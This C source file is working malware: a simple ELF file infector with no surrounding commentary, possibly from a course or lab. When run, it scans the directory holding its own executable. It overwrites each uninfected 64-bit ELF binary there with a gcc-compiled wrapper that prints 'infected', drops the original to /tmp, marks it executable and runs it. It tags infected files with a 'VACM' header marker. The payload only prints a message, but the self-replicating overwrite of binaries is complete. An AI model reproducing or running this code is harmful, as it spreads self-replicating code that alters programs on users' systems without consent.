#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <string.h>
#include <unistd.h>
#include <sys/user.h>
#include <elf.h>
#include <errno.h>
#include <sys/types.h>
#include <dirent.h>
char buff[1<<20];
void put_infected(char *filename){
	FILE *fp=fopen(filename,"r");
	int size=fread(buff,1,1<<20,fp);
	fclose(fp);	
	buff[EI_PAD]='V';
	buff[EI_PAD+1]='A';
	buff[EI_PAD+2]='C';
	buff[EI_PAD+3]='M';
	fp=fopen(filename,"w");
	fwrite(buff,1,size,fp);
	fclose(fp);				
}
int check(char *filename){

	FILE *fp=fopen(filename,"r");
	if(fp==NULL)return 1;
	int size=fread(buff,1,1<<20,fp);
	fclose(fp);	
	if(size>(1<<20))return 1;
	
	Elf64_Ehdr *ehdr=(Elf64_Ehdr*)buff;
	if(ehdr->e_ident[EI_MAG0]!=0x7f 
		||ehdr->e_ident[EI_MAG1]!='E'
		||ehdr->e_ident[EI_MAG2]!='L'
		||ehdr->e_ident[EI_MAG3]!='F')
	return 1;
	
			

	int flag=1;
	if(ehdr->e_ident[EI_PAD]!='V'
		||ehdr->e_ident[EI_PAD+1]!='A'
		||ehdr->e_ident[EI_PAD+2]!='C'
		||ehdr->e_ident[EI_PAD+3]!='M'){
			flag=0;
		}
		

		
	return flag;
	
}

void infect(char *filename){

	if(check(filename))
		return ;
	fprintf(stderr,"infect %s\n",filename);
	FILE *fp=fopen(filename,"r");
	FILE *fc=fopen("_tmp.c","w");
	static char buff[1<<20];
	int size=fread(buff,1,1<<20,fp);
	
	fprintf(fc,"#include<stdio.h>\n \
#include<stdlib.h>\n \
#include<unistd.h>\n \
void bad(){\n \
	puts(\"infected\");\n \
	fflush(stdout);\n \
}\n \
int hellosize=%d; \n \
char *hello=\"",size);
	
	for(int i=0;i<size;i++)
		fprintf(fc,"\\x%02x",((int)buff[i])&255);
	fprintf(fc,"\";\n \
int main(int argv,char **argc){\n \
	bad();\n \
	FILE *tmp=fopen(\"/tmp/_tmp\",\"w\");\n \
	fwrite(hello,1,hellosize,tmp);\n \
	fclose(tmp);\n \
	system(\"chmod +x /tmp/_tmp\");\n \
	execv(\"/tmp/_tmp\",argc);\n \
	return 0;\n \
}\n");
	
	fclose(fp);	
	fclose(fc);	
	
	char cmd[111];
	sprintf(cmd,"gcc _tmp.c -o %s",filename);
	system(cmd);
	put_infected(filename);
	return ;
}

void run(){
	char path[111],name[111];
	readlink("/proc/self/exe", path, sizeof(path));
	int len=strlen(path),i,j;
	for(i=len-1;i>=0;i--)if(path[i]=='/'){
		path[i]=0;
		for(j=i+1;j<len;j++)
			name[j-i-1]=path[j];
		name[len-i-1]=0;
		break;
	}
	DIR  *dir;
    struct    dirent    *ptr;
    
    dir = opendir(path);
    while((ptr = readdir(dir)) != NULL){
    	if(strcmp(name,ptr->d_name))
	    	infect(ptr->d_name);
    }
    closedir(dir);
}

int main(){
	run();

	return 0;
}
